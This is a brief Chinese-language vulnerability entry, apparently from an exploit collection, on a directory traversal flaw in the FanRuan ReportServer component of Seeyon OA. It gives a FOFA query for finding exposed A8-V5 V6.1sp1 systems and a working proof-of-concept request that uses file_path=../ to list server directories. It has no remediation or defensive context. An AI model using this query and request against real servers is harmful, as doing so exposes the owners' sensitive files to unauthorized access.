## 致远OA帆软组件ReportServer目录遍历漏洞

致远OA 帆软组件 ReportServer接口存在目录遍历漏洞，攻击者通过漏洞可以获取服务器敏感信息

## fofa

```
title="致远A8-V5协同管理软件 V6.1sp1"
```

## poc

```
/seeyonreport/ReportServer?op=fs_remote_design&cmd=design_list_file&file_path=../&currentUserName=admin&currentUserId=1&isWebReport=true
```

![img](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202406131002733.png)